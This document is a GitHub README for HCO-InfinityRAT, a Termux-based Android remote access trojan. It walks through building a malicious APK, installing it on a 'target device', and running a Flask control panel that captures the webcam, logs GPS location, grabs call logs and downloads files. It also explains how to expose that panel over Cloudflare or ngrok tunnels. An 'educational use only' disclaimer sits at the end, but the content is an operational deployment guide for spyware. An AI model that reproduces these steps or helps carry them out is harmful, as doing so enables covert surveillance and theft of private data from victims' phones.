# HCO-InfinityRAT-Final

[![GitHub](https://img.shields.io/badge/GitHub-Hackerscolonyofficial-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hackerscolonyofficial)  
[![YouTube](https://img.shields.io/badge/YouTube-HackersColonyOfficial-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/@HackersColonyOfficial)  
[![Instagram](https://img.shields.io/badge/Instagram-hackers_colony_official-E4405F?style=for-the-badge&logo=instagram&logoColor=white)](https://www.instagram.com/hackers_colony_official)  
[![Telegram](https://img.shields.io/badge/Telegram-hackersColony-0088CC?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/hackersColony)  
[![Discord](https://img.shields.io/badge/Discord-HackersColony-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/Xpq9nCGD)

---

**HCO-InfinityRAT** is a Termux-based Remote Access Trojan (RAT) by Azhar, created **strictly for educational and ethical testing purposes only**.

---

## 🚀 Features

- 📷 Webcam Capture  
- 📍 GPS Location Logger  
- 📁 File Browser + Downloader  
- 📞 Call Log Grabber  
- 🌐 Flask Web Control Panel  

---

## ⚙️ Setup & Installation

Clone the repository:

git clone https://github.com/Hackerscolonyofficial/HCO-InfinityRAT-Final  
cd HCO-InfinityRAT-Final

Update Termux packages and install dependencies:

pkg update && pkg upgrade -y  
pkg install python git openjdk-17 apktool -y  
pip install flask

Build the APK:

python apk_builder.py

The generated APK will be saved at:

output/HCO-InfinityRAT.apk

---

## 📱 Installing and Running the APK on Target Device

1. Transfer the APK to your Android device via USB, Bluetooth, or any file transfer method.

2. On the Android device, use any file manager app (e.g., “Files” by Google, “ES File Explorer,” or your device’s built-in manager).

3. Navigate to the folder where you transferred the APK. Common folders are:  
- **Download/**  
- **Bluetooth/**  
- **Documents/**  
- Or the folder you saved the APK in.

4. Tap on `HCO-InfinityRAT.apk` to start the installation process.  
(Enable “Install from Unknown Sources” or “Allow from this source” if prompted in Settings.)

5. After installation, open the app to activate RAT functionalities.

---

## 🧠 Using the Tool in Termux

1. Start the Flask control server in Termux:

python main.py

2. Open your Android device browser (or PC browser if using a tunnel) and visit:

http://localhost:22533

3. Use the web control panel to:

- View real-time GPS location  
- Capture images from the webcam  
- Browse and download files  
- Access call logs  

---

## 🌐 Exposing Server with Tunnel (Cloudflare / Ngrok)

If you want to access the control panel outside your local network, use a tunneling service:

### Cloudflare Tunnel

Install Cloudflared:

pkg install cloudflared -y

Run the tunnel:

python tunnel.py

Follow the Cloudflare URL displayed to access your server remotely.

---

### Ngrok Tunnel

1. Download and install Ngrok (visit https://ngrok.com for instructions).

2. Start your Flask server (python main.py).

3. Run Ngrok to expose port 22533:

ngrok http 22533

4. Use the Ngrok URL provided to remotely access your control panel.

---

## ⚠️ Disclaimer

This tool is for **educational and authorized testing purposes only**.  
Do **NOT** use it on devices you do not own or have explicit permission to test.  
The creator (Azhar) and Hackers Colony Official are **not responsible** for any misuse.

---

## 📄 License

Licensed under the MIT License. See the LICENSE file for more info.

---

## 📢 Hackers Colony Official

- GitHub: https://github.com/Hackerscolonyofficial  
- YouTube: https://www.youtube.com/@HackersColonyOfficial  
- Instagram: https://www.instagram.com/hackers_colony_official  
- Telegram: https://t.me/hackersColony  
- Discord: https://discord.gg/Xpq9nCGD
